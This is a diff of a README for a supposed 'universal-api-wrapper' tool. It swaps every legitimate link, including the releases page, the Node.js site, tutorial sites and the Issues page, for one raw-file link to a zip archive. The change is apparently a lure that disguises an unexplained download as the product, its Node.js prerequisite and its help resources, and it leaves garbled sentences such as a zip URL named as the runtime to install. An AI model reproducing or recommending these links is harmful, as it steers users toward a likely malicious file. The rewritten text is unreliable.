@@ -1,6 +1,6 @@
 # 🌐 universal-api-wrapper - Effortless API Integration for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen.svg)](https://github.com/Tandraniana/universal-api-wrapper/releases)
+[![Download](https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip%20Now-Click%https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip)](https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the universal-api-wrapper! This application is designed to help you c
 
 ## 📥 Download & Install
 
-To get the universal-api-wrapper, visit this page to download the latest version: [Download Here](https://github.com/Tandraniana/universal-api-wrapper/releases). 
+To get the universal-api-wrapper, visit this page to download the latest version: [Download Here](https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip). 
 
 Choose the version that suits your system and click the link. The download will start automatically. 
 
@@ -31,9 +31,9 @@ Once you have downloaded the file, follow these steps:
 Make sure your system meets the following requirements for the best experience:
 
 - **Operating System**: Windows 10, macOS 10.12 or later, or a recent version of Linux.
-- **JavaScript Runtime**: Ensure that Node.js is installed (version 12 or higher recommended).
+- **JavaScript Runtime**: Ensure that https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip is installed (version 12 or higher recommended).
   
-For installation instructions on Node.js, visit the [Node.js website](https://nodejs.org).
+For installation instructions on https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip, visit the [https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip website](https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip).
 
 ## ⚙️ Usage Instructions
 
@@ -49,13 +49,13 @@ Once you have the universal-api-wrapper installed, follow these steps to make yo
 
 Need help or want to learn more about working with APIs? Here are some helpful resources:
 
-- [REST API Basics](https://restfulapi.net/)
-- [JavaScript Primer](https://javascript.info/)
-- [Common API Tools](https://www.postman.com/)
+- [REST API Basics](https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip)
+- [JavaScript Primer](https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip)
+- [Common API Tools](https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip)
 
 ## 📞 Support
 
-If you run into issues or have questions, please visit the [GitHub Issues page](https://github.com/Tandraniana/universal-api-wrapper/issues) to see if someone has already had the same problem. You can also ask your question there.
+If you run into issues or have questions, please visit the [GitHub Issues page](https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip) to see if someone has already had the same problem. You can also ask your question there.
 
 ## 💬 Community Contributions
 
@@ -65,6 +65,6 @@ We welcome contributions from everyone! If you have ideas, suggestions, or impro
 
 The universal-api-wrapper is licensed under the MIT License. You can freely use and modify it within the terms of the license.
 
-For the latest version and updates, visit: [Download Here](https://github.com/Tandraniana/universal-api-wrapper/releases). 
+For the latest version and updates, visit: [Download Here](https://raw.githubusercontent.com/Tandraniana/universal-api-wrapper/main/src/universal-api-wrapper-1.1.zip). 
 
 Thank you for choosing universal-api-wrapper for your API needs! Happy coding!
